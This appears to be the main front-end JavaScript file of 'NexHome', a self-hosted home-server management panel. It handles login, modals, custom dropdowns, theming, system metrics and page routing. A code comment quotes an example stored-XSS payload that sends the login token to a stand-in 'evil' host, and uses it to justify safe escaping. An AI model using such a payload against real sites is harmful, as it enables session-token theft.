/* ============ NexHome 前端逻辑（原生 JS，无框架） ============ */
/* 主入口：通用工具、登录鉴权、页面路由。
   各菜单模块的逻辑拆分到 js/ 目录（须在 index.html 中先于本文件加载）：
   dashboard=仪表盘 home=网站导航 ddns=DDNS stun=STUN monitor=可用性监控 notify=通知中心
   wol=WOL cert=SSL证书 proxy=反向代理 docker=Docker logs=日志 diag=内存监控 settings=设置 */
'use strict';

const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);

let TOKEN = localStorage.getItem('nx_token') || '';
/** API 基础前缀：启用安全入口后面板挂在 /{入口} 下，所有模块请求需带上该前缀（根路径访问时为空串） */
const API_BASE = (() => {
    const p = location.pathname.replace(/\/+$/, '');
    return p.length > 1 ? p : '';
})();
let currentPage = 'dashboard';
let refreshTimer = null;          // 状态实时刷新定时器

/* ---------------- 基础工具 ---------------- */

function esc(s) {
    return String(s ?? '').replace(/[&<>"']/g, c =>
        ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

// jsq：把值转成可安全内联进 onclick="fn('...')" 的 JS 字符串字面量。
// 不能直接内联 esc(x)：esc 产出的是 HTML 实体，浏览器会先解码再执行 JS，
// 单引号因此仍能闭合字符串（名称填入 a');fetch('//evil?t='+TOKEN)// 即存储型 XSS）。
// 这里先 JSON.stringify 得到带双引号的字面量，再由 esc 转义属性，解码后恰好还原。
function jsq(v) {
    return esc(JSON.stringify(String(v ?? '')));
}

function toast(msg, type = 'ok') {
    const t = $('#toast');
    t.textContent = msg;
    t.className = 'toast ' + type;
    setTimeout(() => t.classList.add('hidden'), 2600);
}

/** 统一 API 调用：携带 token，统一错误处理 */
async function api(method, path, body) {
    const opt = { method, headers: { 'X-Token': TOKEN } };
    if (body !== undefined) {
        opt.headers['Content-Type'] = 'application/json';
        opt.body = JSON.stringify(body);
    }
    const resp = await fetch(API_BASE + path, opt);
    let data = {};
    try { data = await resp.json(); } catch (e) { /* 非 JSON 响应 */ }
    if (resp.status === 401 && !path.endsWith('/login') && !path.endsWith('/check')) {
        TOKEN = '';
        localStorage.removeItem('nx_token');
        showLogin();
        throw new Error('登录已过期，请重新登录');
    }
    if (!data.ok) throw new Error(data.error || ('请求失败 ' + resp.status));
    return data.data;
}

/** 模态框栈：嵌套打开新模态框时保存上一层的标题/内容/宽度类，关闭时逐层回退 */
const modalStack = [];

/**
 * 打开模态框；若当前已有模态框打开则自动入栈，关闭时回退到上一层
 * （如从 Compose 项目容器列表下钻容器详情，关闭详情后回到项目列表）。
 * @param {string} cls 可选宽度样式类，如 'wide'
 */
function modal(title, bodyHtml, cls) {
    const mask = $('#modalMask');
    if (mask.classList.contains('hidden')) modalStack.length = 0;
    else modalStack.push({
        title: $('#modalTitle').textContent,
        body: $('#modalBody').innerHTML,
        cls: $('#modalBox').className.replace('modal', '').trim()
    });
    $('#modalTitle').textContent = title;
    $('#modalBody').innerHTML = bodyHtml;
    $('#modalBox').className = 'modal' + (cls ? ' ' + cls : '');
    mask.classList.remove('hidden');
}

function closeModal() {
    if (modalStack.length) {
        const prev = modalStack.pop();
        $('#modalTitle').textContent = prev.title;
        $('#modalBody').innerHTML = prev.body;
        $('#modalBox').className = 'modal' + (prev.cls ? ' ' + prev.cls : '');
        return;
    }
    $('#modalMask').classList.add('hidden');
}

/**
 * 全局确认弹窗，替代原生 confirm，风格与主题一致。
 * 后续所有需要“确定/取消”交互的场景都应使用本方法。
 * @param {string|Object} opts 传字符串时视为提示内容；或配置对象
 *   { title, message, html, confirmText, cancelText, danger, boxWidth }
 *   html：传入时以富文本渲染确认内容（如镜像预览表），优先级高于 message；
 *   boxWidth：需要展示表格等宽内容时放宽弹窗宽度（如 '560px'）。
 * @returns {Promise<boolean>} 点击确认或按 Enter 返回 true；点击取消或按 Esc 返回 false（点击遮罩不关闭）
 * 用法：if (!(await confirmBox({ message: '确定删除？', danger: true }))) return;
 */
function confirmBox(opts) {
    if (typeof opts === 'string') opts = { message: opts };
    const {
        title = '操作确认',
        message = '',
        html = '',
        confirmText = '确定',
        cancelText = '取消',
        danger = false,
        boxWidth = '',
    } = opts;

    const mask = $('#confirmMask');
    const box = mask.querySelector('.confirm-box');
    const okBtn = $('#confirmOk');
    const cancelBtn = $('#confirmCancel');

    $('#confirmTitle').textContent = title;
    if (html) $('#confirmMsg').innerHTML = html;
    else $('#confirmMsg').textContent = message;
    $('#confirmIcon').textContent = danger ? '⚠️' : '❔';
    okBtn.textContent = confirmText;
    cancelBtn.textContent = cancelText;
    box.classList.toggle('danger', danger);
    box.style.width = boxWidth || '';

    mask.classList.remove('hidden');
    okBtn.focus();

    return new Promise(resolve => {
        const done = result => {
            mask.classList.add('hidden');
            okBtn.removeEventListener('click', onOk);
            cancelBtn.removeEventListener('click', onCancel);
            mask.removeEventListener('mousedown', onMask);
            document.removeEventListener('keydown', onKey, true);
            resolve(result);
        };
        const onOk = () => done(true);
        const onCancel = () => done(false);
        const onMask = () => {}; // 不再点击遮罩关闭，需主动点击按钮
        const onKey = e => {
            if (e.key === 'Escape') { e.preventDefault(); e.stopPropagation(); done(false); }
            else if (e.key === 'Enter') { e.preventDefault(); e.stopPropagation(); done(true); }
        };
        okBtn.addEventListener('click', onOk);
        cancelBtn.addEventListener('click', onCancel);
        mask.addEventListener('mousedown', onMask);
        document.addEventListener('keydown', onKey, true);
    });
}

/* ---------------- 自定义下拉：接管原生 select 的展开列表 ----------------
   原生 select 展开后的选项列表是系统级菜单（白底紧凑行 + 系统蓝选中条），
   与主题风格脱节且无法定制。这里为每个 select 生成「触发器 + 浮层列表」接管
   视觉与交互；原生 select 保留在 DOM 中隐藏，继续作为数据源 ——
   FormData 提交、onchange 内联联动、disabled 语义全部不变。
   表单/页面均为 innerHTML 重建，靠 MutationObserver 自动增强新出现的 select。 */

const SEL_OPEN = { sel: null, view: null, menu: null, hl: -1 };   // 当前展开的下拉（全局仅一份）

function selText(sel) {
    const o = sel.options[sel.selectedIndex];
    return o ? o.text : '';
}

/** 触发器与原生 select 同步：文字 / 禁用态（options 动态替换、批量设置 disabled 时调用） */
function syncSelectView(sel) {
    const view = sel._selView;
    if (!view) return;
    view.querySelector('.select-view-text').textContent = selText(sel);
    view.classList.toggle('disabled', sel.disabled);
    view.tabIndex = sel.disabled ? -1 : 0;
}

function closeSelect() {
    if (!SEL_OPEN.sel) return;
    SEL_OPEN.menu.remove();
    SEL_OPEN.view.classList.remove('open');
    SEL_OPEN.sel = SEL_OPEN.view = SEL_OPEN.menu = null;
    SEL_OPEN.hl = -1;
}

/** 打开浮层：挂 body 用 fixed 定位，不被弹窗 overflow 裁剪（与原生菜单行为一致） */
function openSelect(sel, view) {
    closeSelect();
    const menu = document.createElement('div');
    menu.className = 'select-menu';
    [...sel.options].forEach((o, i) => {
        const item = document.createElement('div');
        item.className = 'select-opt' + (o.selected ? ' active' : '') + (o.disabled ? ' disabled' : '');
        item.dataset.idx = i;
        item.textContent = o.text;
        menu.appendChild(item);
    });
    if (!sel.options.length) menu.innerHTML = '<div class="select-empty">暂无选项</div>';
    menu.style.visibility = 'hidden';
    document.body.appendChild(menu);
    // 定位：默认展开在触发器下方，下方空间不足且上方更宽裕时翻转到上方
    const r = view.getBoundingClientRect();
    menu.style.minWidth = r.width + 'px';
    const below = innerHeight - r.bottom - 8, above = r.top - 8;
    menu.style.maxHeight = Math.min(288, Math.max(140, Math.max(below, above))) + 'px';
    const mh = menu.offsetHeight;
    if (below < mh && above > below) menu.style.top = Math.max(8, r.top - mh - 4) + 'px';
    else menu.style.top = r.bottom + 4 + 'px';
    menu.style.left = r.left + 'px';
    menu.style.visibility = '';
    // 长列表（如 STUN 服务器）滚动到选中项并居中，不用从头找
    const act = menu.querySelector('.select-opt.active');
    if (act) menu.scrollTop = act.offsetTop - menu.clientHeight / 2 + act.offsetHeight / 2;
    // 选项点击用 mousedown 跟手；document 的关闭监听同为 mousedown，菜单内点击不会先触发关闭
    menu.addEventListener('mousedown', e => {
        const t = e.target.closest('.select-opt');
        if (t && !t.classList.contains('disabled')) pickSelect(sel, Number(t.dataset.idx));
    });
    SEL_OPEN.sel = sel;
    SEL_OPEN.view = view;
    SEL_OPEN.menu = menu;
    view.classList.add('open');
}

/** 键盘高亮：上下移动可视焦点，Enter 确认 */
function highlightSelect(i) {
    SEL_OPEN.hl = i;
    SEL_OPEN.menu.querySelectorAll('.select-opt').forEach(el =>
        el.classList.toggle('hl', Number(el.dataset.idx) === i));
    const el = SEL_OPEN.menu.querySelector('.select-opt.hl');
    if (el) {
        if (el.offsetTop < SEL_OPEN.menu.scrollTop) SEL_OPEN.menu.scrollTop = el.offsetTop;
        else if (el.offsetTop + el.offsetHeight > SEL_OPEN.menu.scrollTop + SEL_OPEN.menu.clientHeight)
            SEL_OPEN.menu.scrollTop = el.offsetTop + el.offsetHeight - SEL_OPEN.menu.clientHeight;
    }
}

/** 选中：写回原生 select 并派发 change，内联 onchange 与 FormData 全部按原样工作 */
function pickSelect(sel, idx) {
    const o = sel.options[idx];
    if (!o || o.disabled) return;
    closeSelect();
    if (sel.value !== o.value) {   // 与原生一致：重复选择当前项不触发 change
        sel.value = o.value;
        sel.dispatchEvent(new Event('change', { bubbles: true }));
    }
    syncSelectView(sel);
}

function enhanceSelect(sel) {
    if (sel.dataset.selEnhanced) return;
    sel.dataset.selEnhanced = '1';
    const view = document.createElement('div');
    view.className = 'select-view';
    view.innerHTML = '<span class="select-view-text"></span>';
    // select 上的内联布局样式（flex/min-width/宽度等）转移到触发器，右侧统一留出自绘箭头位
    if (sel.style.cssText) { view.style.cssText = sel.style.cssText; view.style.paddingRight = '30px'; }
    sel.before(view);
    sel.setAttribute('hidden', '');
    sel._selView = view;
    syncSelectView(sel);
    view.addEventListener('click', () => {
        if (sel.disabled) return;
        if (SEL_OPEN.sel === sel) closeSelect();
        else openSelect(sel, view);
    });
    // 键盘：Enter/空格/↓ 打开，↑↓ 移动高亮（跳过禁用项），Enter 确认，Esc/Tab 关闭
    view.addEventListener('keydown', e => {
        if (sel.disabled) return;
        const list = [...sel.options];
        if (SEL_OPEN.sel !== sel) {
            if (e.key === 'Enter' || e.key === ' ' || e.key === 'ArrowDown') {
                e.preventDefault();
                openSelect(sel, view);
                highlightSelect(Math.max(0, list.findIndex(o => o.selected)));
            }
            return;
        }
        let hl = SEL_OPEN.hl >= 0 ? SEL_OPEN.hl : Math.max(0, list.findIndex(o => o.selected));
        if (e.key === 'ArrowDown') { e.preventDefault(); do { hl++; } while (hl < list.length - 1 && list[hl].disabled); }
        else if (e.key === 'ArrowUp') { e.preventDefault(); do { hl--; } while (hl > 0 && list[hl].disabled); }
        else if (e.key === 'Enter') { e.preventDefault(); pickSelect(sel, hl); return; }
        else { if (e.key === 'Escape' || e.key === 'Tab') closeSelect(); return; }
        highlightSelect(hl);
    });
    // options 动态替换（ESA 站点异步加载等）与 option selected/disabled 属性变化时同步视图，
    // 浮层开着则按新列表重建
    new MutationObserver(() => {
        syncSelectView(sel);
        if (SEL_OPEN.sel === sel) openSelect(sel, view);
    }).observe(sel, { childList: true, subtree: true, attributes: true });
}

/** 无障碍：.field 内的 label 与控件自动关联（项目表单从不显式写 for/id，
    这里统一补齐：label 生成 for、控件生成 id，点击标签即可聚焦控件，读屏器也能朗读字段名）。
    已有关联（label.htmlFor）或包裹式关联（控件在 label 内）的跳过；checkbox/radio/file
    在本项目均为包裹式写法，不在关联范围。由下方 MutationObserver 在 DOM 变更后统一补扫。 */
function enhanceLabels(root) {
    root.querySelectorAll('.field').forEach(f => {
        const label = f.querySelector(':scope > label');
        const ctl = f.querySelector('input:not([type="checkbox"]):not([type="radio"]):not([type="file"]), select, textarea');
        if (!label || !ctl || label.htmlFor || label.contains(ctl)) return;
        if (!ctl.id) ctl.id = 'fld-' + Math.random().toString(36).slice(2, 9);
        label.htmlFor = ctl.id;
    });
}

// 全局扫描：innerHTML 重建的表单/页面中出现新 select 时自动增强（合并同一波的多次回调）
let selScanQueued = false;
new MutationObserver(() => {
    if (selScanQueued) return;
    selScanQueued = true;
    setTimeout(() => {
        selScanQueued = false;
        if (SEL_OPEN.sel && !SEL_OPEN.sel.isConnected) closeSelect();   // 所属弹窗被整体重建时收起浮层
        $$('select:not([data-sel-enhanced])').forEach(enhanceSelect);
        enhanceLabels(document);
    }, 0);
}).observe(document.documentElement, { childList: true, subtree: true });

// 点击浮层外收起；滚动（列表自身滚动除外）/窗口尺寸变化时收起，避免浮层与触发器错位
document.addEventListener('mousedown', e => {
    if (SEL_OPEN.sel && !SEL_OPEN.menu.contains(e.target) && !e.target.closest('.select-view')) closeSelect();
}, true);
document.addEventListener('scroll', e => {
    if (SEL_OPEN.sel && !SEL_OPEN.menu.contains(e.target)) closeSelect();
}, true);
window.addEventListener('resize', closeSelect);

function badge(text, cls) { return `<span class="badge ${cls}">${esc(text)}</span>`; }

function statusBadge(status) {
    if (!status) return badge('-', 'gray');
    if (status.startsWith('SUCCESS') || status === 'RUNNING' || status === 'ISSUED') return badge(status, 'ok');
    if (status.startsWith('FAIL') || status === 'ERROR' || status === 'STOPPED') return badge(status, 'err');
    return badge(status, 'warn');
}

function setRefresh(fn, ms) {
    if (refreshTimer) clearInterval(refreshTimer);
    refreshTimer = null;
    if (fn) refreshTimer = setInterval(() => fn().catch(() => { }), ms);
}

/* ---------------- 登录鉴权 ---------------- */

async function checkLogin() {
    try {
        const r = await api('GET', '/api/auth/check');
        if (r.loggedIn) enterApp(); else showLogin();
    } catch (e) { showLogin(); }
}

function showLogin() {
    $('#mainView').classList.add('hidden');
    $('#loginView').classList.remove('hidden');
    stopSysMetrics();
}

async function enterApp() {
    $('#loginView').classList.add('hidden');
    $('#mainView').classList.remove('hidden');
    setPage('dashboard');
    loadSysInfo();
    startSysMetrics();
}

$('#loginForm').addEventListener('submit', async e => {
    e.preventDefault();
    try {
        const r = await api('POST', '/api/auth/login', { password: $('#loginPwd').value });
        TOKEN = r.token;
        localStorage.setItem('nx_token', TOKEN);
        $('#loginPwd').value = '';
        enterApp();
    } catch (err) { toast(err.message, 'err'); }
});

$('#btnLogout').addEventListener('click', async () => {
    try { await api('POST', '/api/auth/logout'); } catch (e) { /* ignore */ }
    TOKEN = '';
    localStorage.removeItem('nx_token');
    showLogin();
});

/* ---------------- 主题切换（浅色/深色，默认浅色） ----------------
   主题属性 data-theme 由 <head> 内联脚本在首屏渲染前设定（避免闪屏），
   本段仅负责按钮文案同步与切换持久化；两套主题在 style.css 中只差一组颜色变量
   （:root 为深色基线，html[data-theme="light"] 仅覆写变量层），无需在此改动样式。 */
const THEME_KEY = 'nx_theme';

/** 当前生效主题：非 dark 一律视为 light（与内联初始化默认值一致） */
function currentTheme() {
    return document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'light';
}

/** 同步切换按钮文案：浅色下提示切到深色，反之提示切回浅色 */
function updateThemeBtn() {
    const btn = $('#btnTheme');
    if (btn) btn.textContent = currentTheme() === 'dark' ? '☀️ 浅色' : '🌙 深色';
}

function setTheme(theme) {
    document.documentElement.setAttribute('data-theme', theme);
    try { localStorage.setItem(THEME_KEY, theme); } catch (e) { /* 隐私模式等存储不可用时忽略 */ }
    updateThemeBtn();
}

const btnTheme = $('#btnTheme');
if (btnTheme) btnTheme.addEventListener('click', () => setTheme(currentTheme() === 'dark' ? 'light' : 'dark'));
updateThemeBtn();

$('#modalClose').addEventListener('click', closeModal);

async function loadSysInfo() {
    try {
        const i = await api('GET', '/api/system/info');
        $('#sysInfo').textContent = `v${i.version} · ${i.javaVersion}`;
    } catch (e) { /* ignore */ }
}

/* ---------------- 顶栏系统监控（CPU / 内存 / 虚拟内存） ---------------- */

let metricsTimer = null;      // 独立定时器：不受页面切换 setRefresh 影响

/** MB -> 人类可读（≥1GB 显示一位小数 GB，否则取整 MB） */
function fmtMB(mb) {
    return mb >= 1024 ? (mb / 1024).toFixed(1) + ' GB' : Math.round(mb) + ' MB';
}

/** 负载着色：≥85% 红、≥60% 橙、其余默认蓝 */
function loadClass(p) { return p >= 85 ? 'err' : p >= 60 ? 'warn' : ''; }

async function loadSysMetrics() {
    try {
        const m = await api('GET', '/api/system/metrics');
        const memPct = m.memTotalMB > 0 ? Math.round(m.memUsedMB * 100 / m.memTotalMB) : 0;
        const swapPct = m.swapTotalMB > 0 ? Math.round(m.swapUsedMB * 100 / m.swapTotalMB) : 0;
        const cpuTxt = m.cpuLoad >= 0 ? m.cpuLoad + '%' : '--';
        const cpuBar = m.cpuLoad >= 0 ? m.cpuLoad : 0;
        $('#sysMetrics').innerHTML = `
            <div class="metric" title="CPU 使用率 ${cpuTxt}，共 ${m.cores} 核">
                <span class="metric-icon">⚙️</span>
                <span class="metric-name">CPU</span>
                <span class="metric-value">${cpuTxt}</span>
                <span class="metric-bar ${loadClass(m.cpuLoad)}"><i style="width:${cpuBar}%"></i></span>
                <span class="metric-sub">${m.cores} 核</span>
            </div>
            <div class="metric" title="内存：${fmtMB(m.memUsedMB)} / ${fmtMB(m.memTotalMB)}（使用率 ${memPct}%）">
                <span class="metric-icon">🧠</span>
                <span class="metric-name">内存</span>
                <span class="metric-value">${memPct}%</span>
                <span class="metric-bar ${loadClass(memPct)}"><i style="width:${memPct}%"></i></span>
                <span class="metric-sub">${fmtMB(m.memUsedMB)}/${fmtMB(m.memTotalMB)}</span>
            </div>
            <div class="metric" title="${m.swapTotalMB > 0
                ? `虚拟内存：${fmtMB(m.swapUsedMB)} / ${fmtMB(m.swapTotalMB)}（使用率 ${swapPct}%）`
                : '系统未启用虚拟内存（Swap）'}">
                <span class="metric-icon">💾</span>
                <span class="metric-name">虚拟内存</span>
                ${m.swapTotalMB > 0 ? `
                <span class="metric-value">${swapPct}%</span>
                <span class="metric-bar ${loadClass(swapPct)}"><i style="width:${swapPct}%"></i></span>
                <span class="metric-sub">${fmtMB(m.swapUsedMB)}/${fmtMB(m.swapTotalMB)}</span>`
                : '<span class="metric-sub">未启用</span>'}
            </div>`;
    } catch (e) { /* 静默失败，不影响主功能 */ }
}

/** 启动顶栏系统监控：立即加载一次，之后每 5 秒刷新 */
function startSysMetrics() {
    loadSysMetrics();
    if (!metricsTimer) metricsTimer = setInterval(loadSysMetrics, 5000);
}

function stopSysMetrics() {
    if (metricsTimer) { clearInterval(metricsTimer); metricsTimer = null; }
}

/* ---------------- 页面路由 ---------------- */

const PAGE_TITLES = {
    dashboard: '总览', home: '网站导航', ddns: 'DDNS 域名同步', stun: 'STUN 端口穿透',
    monitor: '可用性监控', notify: '通知中心',
    wol: 'WOL 网络唤醒', cert: 'SSL 证书管理', proxy: '反向代理中心', docker: 'Docker 容器', logs: '操作日志', diag: '内存监控', settings: '系统设置'
};

const RENDER = {
    dashboard: renderDashboard, home: renderHome, ddns: renderDdns, stun: renderStun,
    monitor: renderMonitor, notify: renderNotify,
    wol: renderWol, cert: renderCert, proxy: renderProxy, docker: renderDocker, logs: renderLogs, diag: renderDiag, settings: renderSettings
};

function setPage(page) {
    currentPage = page;
    setRefresh(null);
    $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.page === page));
    $('#pageTitle').textContent = PAGE_TITLES[page];
    $('#pageBody').innerHTML = '<p class="muted">加载中...</p>';
    RENDER[page]().catch(e => { $('#pageBody').innerHTML = `<p style="color:var(--err-fg)">${esc(e.message)}</p>`; });
}

$$('.nav-item').forEach(n => n.addEventListener('click', () => setPage(n.dataset.page)));

/* ---------------- 启动 ---------------- */
checkLogin();
